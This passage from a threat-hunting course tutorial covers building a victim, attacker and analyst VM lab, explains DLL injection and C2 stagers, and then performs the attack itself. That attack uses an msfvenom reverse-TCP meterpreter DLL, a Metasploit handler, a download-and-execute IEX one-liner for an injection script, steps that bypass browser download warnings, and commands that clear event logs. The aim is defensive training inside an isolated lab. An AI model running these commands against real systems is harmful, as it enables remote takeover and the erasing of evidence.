<li>Now create a new DWORD property EnableScriptBlockLogging and set its value to 1:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
</span></span></code></pre></div><ol start="4">
<li>And finally we&rsquo;ll enable Operational logging to ensure our ScriptBlock logs are saved properly:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil sl &#34;Microsoft-Windows-PowerShell/Operational&#34; /e:true
</span></span></code></pre></div><h1 id="156-install-software">1.5.6. Install Software</h1>
<p>And now we&rsquo;ll install three programs:</p>
<ul>
<li>We&rsquo;ll use <strong>Process Hacker</strong> for live memory forensics.</li>
<li>We&rsquo;ll use <strong>winpmem</strong> to create a memory dump for post-mortem memory forensics.</li>
<li>We&rsquo;ll use <strong>Wireshark</strong> to generate a pcap for traffic analysis.</li>
</ul>
<p>You can download <a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker here</a>. Once downloaded go ahead and install it.</p>
<p>You can download the latest release of <a href="https://github.com/Velocidex/WinPmem/releases">winpmem here</a>. Since its a portable executable there is no installation required, just download the <code>.exe</code> file and place it on the desktop.</p>
<p>And finally the <code>WireShark</code> setup file can be <a href="https://2.na.dl.wireshark.org/win32/Wireshark-win32-3.6.15.exe">downloaded from here</a>. Once downloaded run setup, just keep all options per default, nothing fancy required.</p>
<p>That&rsquo;s it friend. We are done with BY FAR the heaviest lifting in terms of VM setup - the remaining two will comparatively be a breeze. But before we get to that there&rsquo;s one very simple thing we can do that will make our lives much easier in the future - turning this VM into a template for cloning.</p>
<h1 id="157-creating-a-template">1.5.7. Creating a Template</h1>
<p>So why do we want to do this again? Well by turning this VM we just created into a template we are in essence creating an archetype (blueprint). Then, whenever we want this same &ldquo;victim&rdquo; system for any project or course we can simply clone it as many times as we want.</p>
<figure class="custom-figure"><img src="/img/mememe.gif"/>
</figure>

<p>Thus instead of repeating this entire, rather cumbersome process we can click a few buttons and have it ready to go in a few seconds. This is also useful if we ever &ldquo;mess up&rdquo; the VM, we can just come back to this starting point.</p>
<p>So just follow along with these few simple steps:</p>
<ol>
<li>First shut down the VM.</li>
<li>In VMWare you should see the library pane on the LHS listing our VM. If you don&rsquo;t, hit <code>F9</code>, or go to <code>View</code> &gt; <code>Customize</code> &gt; <code>Library</code>.</li>
<li>Right-click on our VM (<code>Victim</code>), select <code>Snapshot</code> &gt; <code>Take Snapshot</code>.</li>
<li>Name it anything you&rsquo;d like, I will be calling it <code>Genesis</code>. Hit <code>Take Snapshot</code>.</li>
<li>Again right-click the VM and select <code>Settings</code>.</li>
<li>On the top left we can see two tabs - <code>Hardware</code> and <code>Options</code>, select <code>Options</code>.</li>
<li>Go down to the bottom and select <code>Advanced</code>.</li>
<li>Select <code>Enable Template mode (to be used for cloning)</code>, hit <code>OK</code>.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image021.png"/>
</figure>

<ol start="9">
<li>Note you might want to rename this VM to something like <code>Victim Template</code>, so we are aware this is the template that we should not be using, but rather use for cloning. You can do this under <code>Settings</code> &gt; <code>Options</code> &gt; <code>General</code>.</li>
<li>Now let&rsquo;s create our first clone which we will actually be using in the course. Right-click on <code>Victim Template</code>, select <code>Manage</code> &gt; <code>Clone</code>. Hit <code>Next</code>.</li>
<li>We&rsquo;ll select the snapshot we created and hit <code>Next</code>.</li>
<li>Keep selection as <code>Create a linked clone</code> and hit <code>Next</code>.</li>
<li>Give your clone a name, I will be calling it <code>Victim01</code>. Choose a location and hit <code>Next</code>.</li>
</ol>
<p>That&rsquo;s it! You should now see both <code>Victim Template</code> and <code>Victim01</code> in your library.</p>
<p>The bad news - we still have two VMs to install. The good news - they will require minimal-to-no configuration, so at this point we&rsquo;re about 80% done with our VM setup. So let&rsquo;s get it done.</p>
<hr>
<h1 id="16-vm-2-kali-linux-aka-the-attacker">1.6. VM 2: Kali Linux aka &ldquo;The Attacker&rdquo;</h1>
<figure class="custom-figure"><img src="/img/attacker.gif"/>
</figure>

<p>We&rsquo;ll be using Kali Linux to simulate the attacker. The great thing about Kali Linux is that everything we&rsquo;ll need comes pre-packaged, so we just have to install the actual operating system.</p>
<ol>
<li>In VMWare hit <code>File</code> &gt; <code>New Virtual Machine...</code></li>
<li><code>Typical (recommended)</code> and hit <code>Next</code>.</li>
<li><code>I will install the operating system later</code> and hit <code>Next</code>.</li>
<li>Select <code>Linux</code>, and under Version select <code>Debian 11.x 64-bit</code>. (Note: Kali Linux is built on top of Debian Linux).</li>
<li>Again call the machine whatever you&rsquo;d like, in my case I am calling it <code>Hacker</code>.</li>
<li>Increase the Maximum disk size to 60 GB and select <code>Split virtual disk into multiple files</code>.</li>
<li>Then on the final screen click on <code>Customize Hardware</code>.</li>
<li>Under <code>Memory</code> I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB.</li>
<li>Under <code>Processors</code> I suggest at least 2, if possible given your available resources then increase it to 4.</li>
<li>Under <code>New CD/DVD (SATA)</code> change Connection from Use Physical Drive to <code>Use ISO image file</code>. Click <code>Browse…</code> and select the location of your Kali Linux iso image.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/kali.gif"/>
</figure>

<p>So now let&rsquo;s get to actually installing it:</p>
<ol>
<li>Right-click on the VM and select <code>Power</code> &gt; <code>Start Up Guest</code>.</li>
<li>Select <code>Graphical Install</code>.</li>
<li>Select language, country etc.</li>
<li>Choose any <code>Hostname</code>, leave <code>Domain name</code> blank, for Full name and username I chose <code>hacker</code>.</li>
<li>Create a password, again though OBVIOUSLY not a suggested real-world practice, in these simulations I tend to simply use <code>password</code> since it minimizes any operational friction.</li>
<li>Choose a timezone.</li>
<li>Next select <code>Guided - use entire disk</code> and hit <code>Continue</code>.</li>
<li>The only disk should be selected, hit <code>Continue</code>.</li>
<li>Keep <code>All files in one partition (recommended for new users)</code>, hit <code>Continue</code>.</li>
<li>Keep <code>Finish partitioning and write changes to disk</code>, hit <code>Continue</code>.</li>
<li>Select <code>Yes</code> and <code>Continue</code>.</li>
<li>In <code>Software selection</code> keep the default selection and hit <code>Continue</code>. Kali will now start installing, just be aware this can take a few minutes, probably around 5 to 10.</li>
<li>Next it&rsquo;ll ask you about installing a GRUB boot loader, keep it selected as <code>Yes</code> and hit <code>Continue</code>.</li>
<li>Select <code>/dev/sda</code> and hit <code>Continue</code>. More installing&hellip;</li>
<li>Finally it will inform us it&rsquo;s complete, we can hit <code>Continue</code> causing the system to reboot into Kali Linux. Enter your username and password and hit <code>Log In</code>.</li>
<li>Let&rsquo;s shut down the VM, then right-click on it in the library and select <code>Settings</code>. Under <code>Display</code> deselect <code>Stretch mode</code> and hit <code>OK</code>.</li>
</ol>
<p>And that&rsquo;s it for our attacker machine - feel free to repeat the Template-Cloning process we performed for our Windows 10 VM if you so desire.</p>
<hr>
<h1 id="17-vm-3-ubuntu-linux-2004-aka-the-analyst">1.7. VM 3: Ubuntu Linux 20.04 aka &ldquo;The Analyst&rdquo;</h1>
<h1 id="171-installation">1.7.1. Installation</h1>
<figure class="custom-figure-3"><img src="/img/analysis.gif"/>
</figure>

<p>And now finally we&rsquo;ll set up our Ubuntu VM.</p>
<ol>
<li>In VMWare hit <code>File</code> &gt; <code>New Virtual Machine...</code></li>
<li><code>Typical (recommended)</code> and hit <code>Next</code>.</li>
<li><code>I will install the operating system later</code> and hit <code>Next</code>.</li>
<li>Select <code>Linux</code>, and under Version select <code>Ubuntu 64-bit</code>.</li>
<li>Again call the machine whatever you&rsquo;d like, in my case I am calling it <code>Analyst</code>.</li>
<li>Increase the Maximum disk size to 60 GB and select <code>Split virtual disk into multiple files</code>.</li>
<li>Then on the final screen click on <code>Customize Hardware</code>.</li>
<li>Under <code>Memory</code> I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB.</li>
<li>Under <code>Processors</code> I suggest at least 2, if possible given your available resources then increase it to 4.</li>
<li>Under <code>New CD/DVD (SATA)</code> change Connection from Use Physical Drive to <code>Use ISO image file</code>. Click <code>Browse…</code> and select the location of your Ubuntu Linux 20.04 iso image. Make sure <code>Connect at power on</code> is enabled.
Click <code>Close</code> then <code>Finish</code>.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/fossa.gif"/>
</figure>

<p>So now let&rsquo;s install Focal Fossa:</p>
<ol>
<li>Right-click on the VM and select <code>Power</code> &gt; <code>Start Up Guest</code>.</li>
<li>Select <code>Try or Install Ubuntu</code>.</li>
<li>Once it boots up the GUI, select <code>Install Ubuntu</code>.</li>
<li>Select your keyboard and language, hit <code>Continue</code>.</li>
<li>Keep <code>Normal Installation</code> selected, deselect <code>Download updates while installing Ubuntu</code>.</li>
<li>Keep <code>Erase disk and install Ubuntu</code> selected, then hit <code>Install Now</code>.</li>
<li>For the popup asking if you want to <code>Write the changes to disks?</code>, hit <code>Continue</code>.</li>
<li>Choose a timezone and hit <code>Continue</code>.</li>
<li>Now fill in your name and desired credentials, I&rsquo;ll be using <code>analyst</code> and <code>password</code>.</li>
<li>When it&rsquo;s complete you can power the system off. Go into settings, under <code>CD/DVD (SATA)</code> disable <code>Connect at power on</code>.</li>
<li>Then goto <code>Display</code>, disable <code>Stretch mode</code>.</li>
<li>Hit <code>OK</code>, start the VM up once again, and log in.</li>
</ol>
<p><code>NOTE: A few moments after logging in and answer Ubuntu's questions you'll be asked whether you want to upgrade. IMPORTANT: Do not do so, decline the offer.</code></p>
<figure class="custom-figure-2"><img src="/img/image029.png"/>
</figure>

<p>OK, that&rsquo;s it for the installation, now let&rsquo;s install the two programs we&rsquo;ll use in this course. Note I&rsquo;m also going to install <em><strong>RITA</strong></em> here, we won&rsquo;t use it in this course but indeed in the next one. So feel free to skip this, or just get it done with now so that next time everything is gtg.</p>
<h1 id="172-install-software">1.7.2. Install Software</h1>
<h1 id="volatility3">Volatility3</h1>
<ol>
<li>Either download the zip file from the repo <a href="https://github.com/volatilityfoundation/volatility3">here</a>, or run the command below from terminal to clone the repo:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>git clone https://github.com/volatilityfoundation/volatility3.git
</span></span></code></pre></div><ol start="2">
<li>Next we&rsquo;ll need to install <em><strong>pip</strong></em>, which is a package manager for <em><strong>Python</strong></em> (<em><strong>Volatility</strong></em> is written in <em><strong>Python</strong></em>). We&rsquo;ll do this so we can install all the required package dependencies. Run the following commands:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt update
</span></span><span style="display:flex;"><span>sudo apt install python3-pip
</span></span></code></pre></div><ol start="3">
<li>Once that&rsquo;s complete we can install our package dependencies. Open a terminal and navigate to where you cloned <em><strong>Volatility</strong></em>. Now simply run the following command:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pip3 install -r requirements.txt
</span></span></code></pre></div><h1 id="wireshark">WireShark</h1>
<ol>
<li>Run the following command to update the packet repository cache:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt update
</span></span></code></pre></div><ol start="2">
<li>Now run the following command to install <em><strong>WireShark</strong></em>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt install wireshark
</span></span></code></pre></div><h1 id="rita-optional">RITA (Optional)</h1>
<p>Here&rsquo;s the cool thing about installing <em><strong>RITA</strong></em>: when we do so it will also automatically install <em><strong>Zeek</strong></em>, which is another amazing tool for traffic analysis we&rsquo;ll be using in the future.</p>
<ol>
<li>Goto the <a href="https://github.com/activecm/rita">RITA Github repo</a>.</li>
<li>Scroll down to <code>Install</code> and follow the instructions using the <code>install.sh</code> script. During installation you will be asked a few questions, answer <code>y</code> and hit enter each time.</li>
<li>Let&rsquo;s check the version of RITA to ensure installation was successful. First close your terminal, reopen, and then run the commands seen in image below. You should get similar results.</li>
</ol>
<figure class="custom-figure"><img src="/img/image030.png"/>
</figure>

<p>OK. Do you know what time it is?</p>
<p>Yeah it&rsquo;s time for all this installing and configuring to pay off - let&rsquo;s kick things off by performing the attack!</p>
<figure class="custom-figure"><img src="/img/strangelove.gif"/>
</figure>

<hr>
<hr>
<h1 id="2-performing-the-attack">2. Performing the Attack</h1>
<h1 id="21-introduction">2.1. Introduction</h1>
<p>Why are we performing the attack ourselves? Why didn&rsquo;t I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?</p>
<figure class="custom-figure"><img src="/img/cruel.gif"/>
</figure>

<p>Nah. The reason is pretty simple - I have a deep sense of conviction that one can only truly &ldquo;get&rdquo; defense if you equally &ldquo;get&rdquo; offense. If I just black box that entire process and give you the data, then once we start hunting everything is abstract. The commands we ran, the files we used, the techniques we employed etc are all just ideas.So then, when you learn to threat hunt these artifacts that exists solely as ideas it&rsquo;ll mostly be memorization - if X happens then I do Y.</p>
<p>But, if instead you do the attack first and learn by doing it yourself, it does not exist as an abstract idea but as a concrete experience. I think then when you perform the threat hunt, because you have a connection to these things you are hunting, well then you learn less through memorization and more through understanding.</p>
<figure class="custom-figure-3"><img src="/img/cereal.gif"/>
</figure>

<p>So let&rsquo;s jump into a bit of theory that will help us understand just what we are getting up to once we perform the actual attack, which will follow immediately afterwards.</p>
<hr>
<h1 id="22-theory">2.2. Theory</h1>
<h1 id="221-what-is-a-dll">2.2.1. What is a DLL?</h1>
<p>A DLL is a file containing shared code. It&rsquo;s not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. Hence the name being Dynamic Link <em><strong>Library</strong></em>.</p>
<figure class="custom-figure-3"><img src="/img/library.gif"/>
</figure>

<p>So think of a DLL as a virtual communal resource: suppose you have 4 programs running and they all want to use a common function - let&rsquo;s say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they&rsquo;ll instead access a DLL that contains the function to minimize gui windows instead.</p>
<p>So when you click on the minimize icon and that program needs the code to know how to behave, it does not get instructions from its own program code, rather it pulls it from the appropriate DLL with some help from the Windows API.</p>
<p>Thus any program you run will constantly call on different DLLs to get access to a wide-variety of common (and often critical) functions and data.</p>
<h1 id="222-what-is-a-dll-injection-attack">2.2.2. What is a DLL-Injection Attack?</h1>
<p>So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs.</p>
<p>With a DLL-injection attack an attacker enters into the population of legitimate DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. Once the malicious DLL is ready, the attacker then basically tricks a legitimate app into loading it into its memory space and then executing it. Thus a DLL injection is a way to get another program to run your code, instead of creating a program specifically to do so.</p>
<figure class="custom-figure"><img src="/img/trick.gif"/>
</figure>

<p>Threat actors love injecting DLLs for two main reasons. First, injected code runs with the same privileges as the legitimate process - meaning potentially elevated. Second, doing so makes it, in general, harder to detect. There&rsquo;s no longer an opportunity to find a &ldquo;smoking gun&rdquo; .exe file, rather to find anything malicious we need to peer beneath the processes at an arguably more convoluted level of abstraction.</p>
<figure class="custom-figure-3"><img src="/img/invisible.gif"/>
</figure>

<p>So that&rsquo;s DLL injection in a nutshell, but what then is <em>standard</em> DLL-injection? Well there are a few ways in which to achieve the process I described above, of which standard is one such way. What distinguishes it is that the malicious DLL is first written to the victim&rsquo;s disk before being injected. This can obviously be considered a design flaw since it will create residual IOCs on the disk which, compared to memory, is non-ephemeral.</p>
<p>As a side-note: the thus logical evolutionary improvement on standard DLL-injections are <em>reflective loading</em> DLL-injections. Instead of writing the malicious DLL to disk, they inject it directly into memory thereby increasing the volatility of any evidence. But hold that thought until our next course, where we&rsquo;ll be covering it.</p>
<figure class="custom-figure-2"><img src="/img/hold.gif"/>
</figure>

<h1 id="223-what-is-a-command-and-control-c2-stager-server-and-payload">2.2.3. What is a Command and Control (C2) Stager, Server, and Payload?</h1>
<p>Let&rsquo;s start by sketching a scenario of how a typical attack might play out in 2023. An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the so-called <em>&ldquo;urgent invoice&rdquo;</em> attached to the malicious email.</p>
<figure class="custom-figure"><img src="/img/drevil.gif"/>
</figure>

<p>Opening this attachment executes a tiny program called a <code>stager</code>. A stager, though not inherently malicious, &ldquo;sets the stage&rdquo; by typically performing one specific task. Once launched the stager will reach out to a designated address (often a web server owned by the hacker) to download + execute another piece of code.</p>
<p>This new code, depending on its exact <em>modus operandi</em>, goes by a few names: most commonly its referred to as a <code>payload</code> or <code>implant</code>. And briefly: the reason this stepped method is utilized instead of simply attaching the payload directly to the email is to avoid detection. Not only then is the initial attachment much smaller (since its a simple script with a single function), but it also does not contain any malicious code, thereby reducing the probability of generating an alert.</p>
<figure class="custom-figure"><img src="/img/beavis.gif"/>
</figure>

<p>So the employee opened an attachment to an email, which launched a stager, which in turn downloaded a payload. This payload now will connect back to the attacker&rsquo;s system to establish a connection to the victim&rsquo;s system. But it not only creates the connection, but also serves as a &ldquo;gateway&rdquo;. That&rsquo;s to say it allows the attacker to execute commands on the victim&rsquo;s system from their own. And this system, the one the attacker uses to execute commands on that of the victim, is what we call the <code>C2 Server</code>.</p>
<h1 id="224-further-reading">2.2.4. Further Reading</h1>
<p>So though admittedly the previous sections is a somewhat shallow overview of these complex terms, I do think this does suffice for the purposes of moving ahead with the practical component of our course. However in case you wanted to understand it to a greater depth, here are my top picks for this topic:</p>
<p><a href="https://www.youtube.com/watch?v=borfuQGrB8g">Keynote: Cobalt Strike Threat Hunting | Chad Tilbury</a></p>
<p><a href="https://www.youtube.com/watch?v=lz2ARbZ_5tE">In-memory Evasion - Detections | Raphael Mudge</a></p>
<p><a href="https://www.youtube.com/watch?v=ihElrBBJQo8">Advanced Attack Detection | William Burgess +  Matt Wakins</a></p>
<hr>
<h1 id="23-attack">2.3. ATTACK!</h1>
<p>Finally! The time has come to give it our best shot&hellip;</p>
<figure class="custom-figure"><img src="/img/attack_kip.gif"/>
</figure>

<h1 id="231-getting-the-ips">2.3.1. Getting the IPs</h1>
<ol>
<li>Fire up both your Windows 10 and Kali VMs.</li>
<li>On our Kali VM - open a terminal and run <code>ip a</code> so we can see what the ip address is. Write this down, we&rsquo;ll be using it a few times during the generation of our stager and handler. You can see mine below is <strong>192.168.230.155</strong> NOTE: Yours will be different!</li>
</ol>
<figure class="custom-figure"><img src="/img/image032.png"/>
</figure>

<ol start="3">
<li>Now go to the Windows VM. Open an administrative PowerShell terminal. Run <code>ipconfig</code> so we also have the ip of the victim - write this down.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image033.png"/>
</figure>

<ol start="4">
<li>And now, though it&rsquo;s not really required, I like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image034.png"/>
</figure>

<ol start="5">
<li>Next we&rsquo;ll create a simple text file on the victim&rsquo;s desktop which will basically emulate the &ldquo;nuclear codes&rdquo; the threat actor is after. Right-click on the desktop, <code>New</code> &gt; <code>Text document</code>, give it a name and add some generic content.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image035.png"/>
</figure>

<h1 id="232-generate--transfer-stager">2.3.2. Generate + Transfer Stager</h1>
<ol>
<li>On our Kali VM open your terminal.</li>
<li>We are going to run the command below, which will generate a payload for us using <code>msfvenom</code>, a standalone app that is part of the Metasploit framework.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll &gt; /home/hacker/Desktop/evil.dll
</span></span></code></pre></div><ul>
<li>Note the following:
<ul>
<li><code>Lhost</code> is the IP of the <strong>listening</strong> machine, ie the attacker. Yours will be different than mine here, adapt it!</li>
<li><code>Lport</code> is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you&rsquo;d like\</li>
<li><code>-f</code> designates the file type, which of course is DLL in this case.</li>
<li><code>&gt;</code> indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as <code>evil.dll</code> - very subtle!</li>
</ul>
</li>
<li>Below you can see what successful output looks like.</li>
</ul>
<figure class="custom-figure"><img src="/img/image037.png"/>
</figure>

<ol start="3">
<li>Next we want to transfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We&rsquo;ll now create a simple http server with Python. Again <code>8008</code> represents an arbitrary port, feel free to choose something else</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 8008
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image038.png"/>
</figure>

<ol start="4">
<li>Now we&rsquo;ll head over to the victim&rsquo;s system, we can either run a powershell command to download the file (<code>Invoke-WebRequest -Uri &quot;http://192.168.230.155:8008/evil.dll&quot; -OutFile &quot;evil.dll&quot; </code>), or simply open the browser (Edge) and type in the address bar  <code>http://IP of hacker:port of http server</code>, for example:</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image039.png"/>
</figure>

<ol start="5">
<li>As you can see in the image above, you should see the dll file. If you don&rsquo;t, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, <code>Save link as</code>, and in my case I will save it to desktop. Note that Edge may block the download, for example:</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image040.png"/>
</figure>

<ul>
<li>If this is the case, click on the three dots <code>...</code> to the right of this message (More actions), and select <code>Keep</code>. You&rsquo;ll be confronted with another warning, select <code>Show more</code>, then <code>Keep anyway</code>.</li>
</ul>
<figure class="custom-figure-2"><img src="/img/image042.png"/>
</figure>

<ul>
<li>Ok, we now have our malicious DLL on the victim&rsquo;s disk.</li>
</ul>
<ol start="6">
<li>So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can&rsquo;t run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let&rsquo;s head over to our Kali VM.
<ul>
<li><strong>Now, let&rsquo;s run these commands:</strong>
<ul>
<li><code>msfconsole</code>: this will open our metasploit console.</li>
<li><code> use exploit/multi/handler</code>: this sets up a generic payload handler inside the Metasploit framework. The <code>multi</code> in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The <code>handler</code> part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.</li>
<li><code>set payload windows/meterpreter/reverse_tcp</code>:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. <code>windows</code>: This tells the framework that the target system is running Windows. <code>meterpreter</code>: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. <code>reverse_tcp</code>: This creates a reverse TCP connection from the target system back to the attacker&rsquo;s system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="custom-figure"><img src="/img/image043.png"/>
</figure>

<ol start="7">
<li>We now need to set required parameters, to see which ones are required run <code>show options</code>.</li>
</ol>
<figure class="custom-figure"><img src="/img/image044.png"/>
</figure>

<ul>
<li>We can see there are 3 required parameters. The first one <code>EXITFUNC</code> is good as is. Meaning we need only to provide values for <code>LHOST</code> and <code>LPORT</code>, which is the exact same value we provided when we generated our <code>msfvenom</code> stager in step 2 - ie the attacker IP, as well as the port we chose (<strong>88</strong>).</li>
</ul>
<ol start="8">
<li>We can now set these values with two commands:
<ul>
<li><code>set LHOST 192.168.230.155</code> (Note: change IP to YOURS)</li>
<li><code>set LPORT 88</code></li>
</ul>
</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image045.png"/>
</figure>

<ol start="9">
<li>Now to start the listener we can use one of two commands, there&rsquo;s literally no difference. You can either use <code>run</code>, or <code>exploit</code>.</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image046.png"/>
</figure>

<ul>
<li>So now that we have our handler listening for a callback we can go back to our Windows VM to run the code.</li>
</ul>
<h1 id="233-hit-the-record-button">2.3.3. Hit The Record Button</h1>
<p>Alright, since we are now literally about to pull the trigger, let&rsquo;s hit the record button.</p>
<p>First off we want to start capturing our packet capture using <code>WireShark</code>. In the search bar write <code>WireShark</code> and open it. Under <code>Capture</code> you will see the available interfaces, in my case the one we want is called <code>Ethernet0</code> - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It&rsquo;s the active one, ie the one with traffic, we want - see image below.Once you&rsquo;ve identified it, simply double-click on it, this then starts the recording.</p>
<figure class="custom-figure-3"><img src="/img/image036.png"/>
</figure>

<p>One other thing, right before we start our attack I also want to clear both logs we activated - <code>Sysmon</code> and <code>PowerShell ScriptBlock</code>. You see since we&rsquo;ve enabled it, it&rsquo;s likely recorded a bunch of events completely irrelevant to our interest here. So we&rsquo;ll clear them and start anew so our final capture is spared all this noise.</p>
<p>Open a PowerShell terminal as admin, and then run the following two commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil cl &#34;Microsoft-Windows-Sysmon/Operational”
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil cl &#34;Microsoft-Windows-PowerShell/Operational&#34;
</span></span></code></pre></div><h1 id="234-preparing-our-injection-script">2.3.4. Preparing Our Injection Script</h1>
<p>First, we need to perform a bit of <em>Macgyvering</em>&hellip;</p>
<figure class="custom-figure"><img src="/img/macgyver.gif"/>
</figure>

<p>Above in <code>2.3.2</code> we created the malicious DLL (<code>evil.dll</code>). But of course, now we need a script to actually inject the DLL into a running process. One of the most popular scripts to do perform this is called <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1">Invoke-DllInjection.ps1</a> from the <a href="https://github.com/PowerShellMafia/PowerSploit">PowerShell Mafia</a>.</p>
<p>The code as it currently stands on the original repo is however broken, at least when I tried it using multiple configurations. The script has not been updated in a few years, and since it&rsquo;s also been archived it&rsquo;s unlikely it ever will be - the original authors have since moved on to bigger things.</p>
<p>The good news though is I found a simple fix and have updated the script which is now being hosted on <a href="https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1">my github repo here</a>.</p>
<p>And so, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but <code>in no way whatsoever do I want to appear as taking any credit/ownership for it</code>.</p>
<figure class="custom-figure"><img src="/img/notmine.gif"/>
</figure>

<p>The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to <a href="https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1">refer to them</a> if you want.</p>
<p><strong>OK, so now let&rsquo;s go ahead and download + inject the script into memory:</strong></p>
<ol>
<li>On our Windows VM we&rsquo;ll open an administrative PowerShell terminal.</li>
<li>Now we&rsquo;ll run the following command, as mentioned before: it&rsquo;s going to download a script hosted on a web server (GitHub in this case) and then inject it directly into memory.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1&#39;)
</span></span></code></pre></div><ul>
<li>Note that after you run it there won&rsquo;t be any feedback/output. You see, PowerShell is rather stoic -  not receiving any feedback/output almost always means the command ran successfully. Conversely, if there was an error, you&rsquo;ll get some red text telling you what went wrong.</li>
</ul>
<figure class="custom-figure"><img src="/img/stoic.gif"/>
</figure>

<h1 id="235-injecting-our-malicious-dll">2.3.5. Injecting Our Malicious DLL</h1>
<p>Great so the script that will inject <code>evil.dll</code> into a process memory space is now in memory. But to be clear: though we&rsquo;ve injected that script into memory, we&rsquo;ve not yet executed it.</p>
